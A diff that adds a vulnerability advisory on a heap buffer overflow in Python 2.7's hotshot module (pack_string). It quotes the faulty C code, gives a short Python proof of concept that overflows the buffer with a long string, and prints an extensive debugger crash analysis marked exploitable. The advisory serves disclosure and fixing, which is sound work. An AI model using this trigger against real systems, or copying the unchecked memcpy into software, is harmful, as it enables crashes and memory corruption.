@@ -1,0 +1,249 @@
+Title: Python 2.7 hotshot pack_string Heap Buffer Overflow
+Credit: John Leitch (john@autosectools.com)
+Url1: http://autosectools.com/Page/Python-hotshot-pack_string-Heap-Buffer-Overflow
+Url2: http://bugs.python.org/issue24481
+Resolution: Fixed
+
+The Python 2.7 hotspot module suffer from a heap buffer overflow due to a memcpy in the pack_string function at line 633:
+
+static int
+pack_string(ProfilerObject *self, const char *s, Py_ssize_t len)
+{
+    if (len + PISIZE + self->index >= BUFFERSIZE) {
+        if (flush_data(self) < 0)
+            return -1;
+    }
+    assert(len < INT_MAX);
+    if (pack_packed_int(self, (int)len) < 0)
+        return -1;
+    memcpy(self->buffer + self->index, s, len);
+    self->index += len;
+    return 0;
+}
+
+The problem arises because const char *s is variable length, while ProfilerObject.buffer is fixed-length:
+
+typedef struct {
+    PyObject_HEAD
+    PyObject *filemap;
+    PyObject *logfilename;
+    Py_ssize_t index;
+    unsigned char buffer[BUFFERSIZE];
+    FILE *logfp;
+    int lineevents;
+    int linetimings;
+    int frametimings;
+    /* size_t filled; */
+    int active;
+    int next_fileno;
+    hs_time prev_timeofday;
+} ProfilerObject;
+
+An overflow can be triggered by passing a large string to the Profile.addinfo method via the value parameter:
+
+from hotshot.stats import *
+x = hotshot.Profile("A", "A")
+x.addinfo("A", "A" * 0xfceb)
+
+Which produces the following exception:
+
+0:000> r
+eax=00000041 ebx=0000fceb ecx=00003532 edx=00000002 esi=075dcb35 edi=075d9000
+eip=6c29af1c esp=0027fc78 ebp=0027fc80 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+MSVCR90!LeadUpVec+0x70:
+6c29af1c f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+0:000> db edi-0x10
+075d8ff0  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075d9000  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+075d9010  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+075d9020  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+075d9030  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+075d9040  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+075d9050  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+075d9060  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
+0:000> db esi
+075dcb35  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcb45  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcb55  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcb65  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcb75  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcb85  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcb95  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+075dcba5  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+0:000> !heap -p -a edi
+    address 075d9000 found in
+    _DPH_HEAP_ROOT @ 6ca1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 722809c:          75d67c8             2838 -          75d6000             4000
+    6c3194ec verifier!AVrfDebugPageHeapAllocate+0x0000023c
+    77a257b7 ntdll!RtlDebugAllocateHeap+0x0000003c
+    779c77ce ntdll!RtlpAllocateHeap+0x0004665a
+    77981134 ntdll!RtlAllocateHeap+0x0000014d
+    6c2c3db8 MSVCR90!malloc+0x00000079 [f:\dd\vctools\crt_bld\self_x86\crt\src\malloc.c @ 163]
+    1e0ae6d1 python27!PyObject_Malloc+0x00000161 [c:\build27\cpython\objects\obmalloc.c @ 968]
+
+ 
+0:000> !heap -p -a esi
+    address 075dcb35 found in
+    _DPH_HEAP_ROOT @ 6ca1000
+    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
+                                 7228068:          75da300             fd00 -          75da000            11000
+    6c3194ec verifier!AVrfDebugPageHeapAllocate+0x0000023c
+    77a257b7 ntdll!RtlDebugAllocateHeap+0x0000003c
+    779c77ce ntdll!RtlpAllocateHeap+0x0004665a
+    77981134 ntdll!RtlAllocateHeap+0x0000014d
+    6c2c3db8 MSVCR90!malloc+0x00000079 [f:\dd\vctools\crt_bld\self_x86\crt\src\malloc.c @ 163]
+    1e0ae6d1 python27!PyObject_Malloc+0x00000161 [c:\build27\cpython\objects\obmalloc.c @ 968]
+
+ 
+0:000> k4
+ChildEBP RetAddr  
+0027fc80 1e008380 MSVCR90!LeadUpVec+0x70 [f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm @ 289]
+0027fc90 1e008407 python27!pack_string+0x40 [c:\build27\cpython\modules\_hotshot.c @ 634]
+0027fca8 1e0089bb python27!pack_add_info+0x77 [c:\build27\cpython\modules\_hotshot.c @ 652]
+0027fcc0 1e0aafd7 python27!profiler_addinfo+0x5b [c:\build27\cpython\modules\_hotshot.c @ 1020]
+0:000> .frame 1
+01 0027fc90 1e008407 python27!pack_string+0x40 [c:\build27\cpython\modules\_hotshot.c @ 634]
+0:000> dV
+           self = 0x075dcb35
+              s = 0x075da314 "AAAAAAAAAAAAAAAAAAA[...]AA..."
+            len = 0n123572224
+0:000> dt self
+Local var @ esi Type ProfilerObject*
+   +0x000 ob_refcnt        : 0n1094795585
+   +0x004 ob_type          : 0x41414141 _typeobject
+   +0x008 filemap          : 0x41414141 _object
+   +0x00c logfilename      : 0x41414141 _object
+   +0x010 index            : 0n1094795585
+   +0x014 buffer           : [10240]  "AAAAAAAAAAAAAAAAAAA[...]AA..."
+   +0x2814 logfp            : 0x41414141 _iobuf
+   +0x2818 lineevents       : 0n1094795585
+   +0x281c linetimings      : 0n1094795585
+   +0x2820 frametimings     : 0n1094795585
+   +0x2824 active           : 0n1094795585
+   +0x2828 next_fileno      : 0n1094795585
+   +0x2830 prev_timeofday   : 0n4702111234474983745
+
+0:000> !analyze -v -nodb
+*******************************************************************************
+*                                                                             *
+*                        Exception Analysis                                   *
+*                                                                             *
+*******************************************************************************
+
+
+FAULTING_IP: 
+MSVCR90!LeadUpVec+70 [f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm @ 289]
+6c29af1c f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
+ExceptionAddress: 6c29af1c (MSVCR90!LeadUpVec+0x00000070)
+   ExceptionCode: c0000005 (Access violation)
+  ExceptionFlags: 00000000
+NumberParameters: 2
+   Parameter[0]: 00000001
+   Parameter[1]: 075d9000
+Attempt to write to address 075d9000
+
+CONTEXT:  00000000 -- (.cxr 0x0;r)
+eax=00000041 ebx=0000fceb ecx=00003532 edx=00000002 esi=075dcb35 edi=075d9000
+eip=6c29af1c esp=0027fc78 ebp=0027fc80 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
+MSVCR90!LeadUpVec+0x70:
+6c29af1c f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+FAULTING_THREAD:  000013b0
+
+PROCESS_NAME:  pythonw.exe
+
+ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.
+
+EXCEPTION_PARAMETER1:  00000001
+
+EXCEPTION_PARAMETER2:  075d9000
+
+WRITE_ADDRESS:  075d9000 
+
+FOLLOWUP_IP: 
+MSVCR90!LeadUpVec+70 [f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm @ 289]
+6c29af1c f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
+
+NTGLOBALFLAG:  2000000
+
+APPLICATION_VERIFIER_FLAGS:  0
+
+APP:  pythonw.exe
+
+ANALYSIS_VERSION: 6.3.9600.17029 (debuggers(dbg).140219-1702) x86fre
+
+BUGCHECK_STR:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_EXPLOITABLE_FILL_PATTERN_NXCODE
+
+PRIMARY_PROBLEM_CLASS:  STRING_DEREFERENCE_EXPLOITABLE_FILL_PATTERN_NXCODE
+
+DEFAULT_BUCKET_ID:  STRING_DEREFERENCE_EXPLOITABLE_FILL_PATTERN_NXCODE
+
+LAST_CONTROL_TRANSFER:  from 1e008380 to 6c29af1c
+
+STACK_TEXT:  
+0027fc80 1e008380 075d67df 075da314 0000fceb MSVCR90!LeadUpVec+0x70
+0027fc90 1e008407 075da314 1e008960 00000000 python27!pack_string+0x40
+0027fca8 1e0089bb 072e67b4 075da314 0769e788 python27!pack_add_info+0x77
+0027fcc0 1e0aafd7 075d67c8 071aabc0 0769e788 python27!profiler_addinfo+0x5b
+0027fcd8 1e0edd10 0769e788 071aabc0 00000000 python27!PyCFunction_Call+0x47
+0027fd04 1e0f017a 0027fd5c 06d57b18 06d57b18 python27!call_function+0x2b0
+0027fd74 1e0f1150 071a9870 00000000 06d57b18 python27!PyEval_EvalFrameEx+0x239a
+0027fda8 1e0f11b2 06d57b18 071a9870 06d5ba50 python27!PyEval_EvalCodeEx+0x690
+0027fdd4 1e11707a 06d57b18 06d5ba50 06d5ba50 python27!PyEval_EvalCode+0x22
+0027fdec 1e1181c5 0722e260 06d5ba50 06d5ba50 python27!run_mod+0x2a
+0027fe0c 1e118760 6c2f7408 06d17fac 00000101 python27!PyRun_FileExFlags+0x75
+0027fe4c 1e1190d9 6c2f7408 06d17fac 00000001 python27!PyRun_SimpleFileExFlags+0x190
+0027fe68 1e038d35 6c2f7408 06d17fac 00000001 python27!PyRun_AnyFileExFlags+0x59
+0027fee4 1d001017 00000002 06d17f88 1d0011b6 python27!Py_Main+0x965
+0027fef0 1d0011b6 1d000000 00000000 04d3ffa8 pythonw!WinMain+0x17
+0027ff80 76477c04 7ffde000 76477be0 63080f16 pythonw!__tmainCRTStartup+0x140
+0027ff94 7799ad1f 7ffde000 62fa2f53 00000000 KERNEL32!BaseThreadInitThunk+0x24
+0027ffdc 7799acea ffffffff 77980228 00000000 ntdll!__RtlUserThreadStart+0x2f
+0027ffec 00000000 1d001395 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+
+STACK_COMMAND:  .cxr 0x0 ; kb
+
+FAULTING_SOURCE_LINE:  f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm
+
+FAULTING_SOURCE_FILE:  f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm
+
+FAULTING_SOURCE_LINE_NUMBER:  289
+
+FAULTING_SOURCE_CODE:  
+No source found for 'f:\dd\vctools\crt_bld\SELF_X86\crt\src\INTEL\memcpy.asm'
+
+
+SYMBOL_STACK_INDEX:  0
+
+SYMBOL_NAME:  msvcr90!LeadUpVec+70
+
+FOLLOWUP_NAME:  MachineOwner
+
+MODULE_NAME: MSVCR90
+
+IMAGE_NAME:  MSVCR90.dll
+
+DEBUG_FLR_IMAGE_TIMESTAMP:  51ea24a5
+
+FAILURE_BUCKET_ID:  STRING_DEREFERENCE_EXPLOITABLE_FILL_PATTERN_NXCODE_c0000005_MSVCR90.dll!LeadUpVec
+
+BUCKET_ID:  APPLICATION_FAULT_STRING_DEREFERENCE_INVALID_POINTER_WRITE_EXPLOITABLE_FILL_PATTERN_NXCODE_msvcr90!LeadUpVec+70
+
+ANALYSIS_SOURCE:  UM
+
+FAILURE_ID_HASH_STRING:  um:string_dereference_exploitable_fill_pattern_nxcode_c0000005_msvcr90.dll!leadupvec
+
+FAILURE_ID_HASH:  {006f2a1a-db5d-7798-544b-da0c2e0bcf19}
+
+Followup: MachineOwner
+---------
+
+To fix the issue, pack_string should confirm that the fixed-length buffer is of sufficient size prior to performing the memcpy.
